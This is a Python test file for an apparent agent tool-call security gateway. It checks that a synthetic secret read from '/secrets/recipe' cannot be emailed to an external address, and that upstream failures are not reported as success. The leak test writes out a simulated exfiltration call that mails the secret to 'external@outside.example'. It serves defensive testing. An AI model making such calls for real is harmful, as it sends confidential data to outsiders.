"""Additional real THE WEIR security acceptance: information flow and upstream failures.

Only synthetic world state; no external network, procurement, or publication.
"""
import asyncio

from mcp_weir.gateway import Gateway
from mcp_weir.policy import parse_policy
from mcp_weir.store import Store
from mcp_weir.upstream import UpstreamError
from weir_testbed.servers import in_process_upstreams
from weir_testbed.world import World

def run(coro):
    return asyncio.run(coro)

def test_secret_information_flow_cannot_leave_via_mail(tmp_path):
    secret = "PRIVATE-SYNTHETIC-RECIPE-KEY-7420-DO-NOT-SEND"
    world = World.from_fixture({"files": {"/secrets/recipe": secret}})
    upstreams = in_process_upstreams(world)
    policy = parse_policy({
        "policy": {"name": "nasha-ifc", "internal_domains": ["corp.example"]},
        "rules": {"flow_conf_secret": "deny", "gate_egress": "off"},
        "upstreams": {
            "files": {"command": ["python", "-m", "weir_testbed.servers", "files"]},
            "mail": {"command": ["python", "-m", "weir_testbed.servers", "mail"]},
        },
        "tools": {
            "files__read_file": {
                "effect": "read", "result": {"conf": "internal", "integ": "trusted"},
                "result_rules": [{"arg": "path", "glob": "/secrets/*", "conf": "secret"}],
            },
            "mail__send_message": {
                "effect": "egress", "target": {"to": "email"}, "content": ["subject", "body"]
            },
        },
    })
    store = Store(str(tmp_path / "ifc.db"))
    gateway = Gateway(policy, store, {"files": upstreams["files"], "mail": upstreams["mail"]})
    run(gateway.start())
    session = gateway.open_session("nasha-ifc-session")
    read = run(gateway.call_tool_detailed(session, "files__read_file", {"path": "/secrets/recipe"}))
    assert read.forwarded and not read.result.get("isError")
    leak = run(gateway.call_tool_detailed(session, "mail__send_message", {
        "to": "external@outside.example", "subject": "synthetic", "body": secret,
    }))
    assert not leak.forwarded
    assert leak.decision.verdict.name == "DENY"
    assert world.sent == 0
    assert not any(e["op"] == "send" for e in world.effects)
    assert store.verify_chain()[0]
    assert any(e["kind"] == "call.decision" and e["payload"]["verdict"] == "DENY"
               for e in store.events(session_id=session.id))

def test_upstream_failure_is_not_reported_as_success(tmp_path):
    from nasha_lab.weir_adapter import WeirAdapter
    from .test_weir_real_integration import POLICY, TOOL, ARGS
    world = World.from_fixture({})
    upstream = in_process_upstreams(world)["notes"]
    async def failing_call(name, arguments, timeout):
        raise UpstreamError("synthetic upstream unavailable")
    upstream.call_tool = failing_call
    store = Store(str(tmp_path / "upstream.db"))
    gateway = Gateway(parse_policy(POLICY).with_rules(gate_write="off"), store, {"notes": upstream})
    run(gateway.start())
    session = gateway.open_session("nasha-upstream-fault")
    adapter = WeirAdapter(gateway, session, allowed_tools=frozenset({TOOL}))
    result = run(adapter.invoke(TOOL, ARGS, correlation_id=session.id))
    assert not result.forwarded and result.status == "DENY"
    assert not world.effects
    assert store.verify_chain()[0]
